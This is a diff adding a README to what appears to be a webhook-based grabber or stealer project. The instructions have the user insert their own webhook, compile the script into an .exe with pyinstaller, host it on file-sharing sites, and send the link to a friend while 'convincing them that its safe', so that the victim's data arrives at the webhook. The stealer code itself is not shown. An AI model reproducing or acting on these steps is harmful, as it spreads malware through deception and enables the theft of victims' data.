@@ -1,0 +1,13 @@
+# What to do.
+Make sure you do "pip install requests"
+
+Then replace the webhook with yours, then save.
+
+After that you right click on the folder (Empty area/Space), then do open in terminal.
+then you copy the path file of the file (press the file then right clic on it then copy path)
+then you say this: "pyinstaller --onefile (paste your file path [ctrl + v])"
+
+wait for the file "dist" to appear, then wait untill you recieve the attachment below. then close the terminal/cmd
+then click on dist, if you see the .exe, you did all steps correctly. then upload it on to mediafire,mega then send the link to your friend convincing them that its safe or its something else. 
+
+then it will be sent at your webhook!
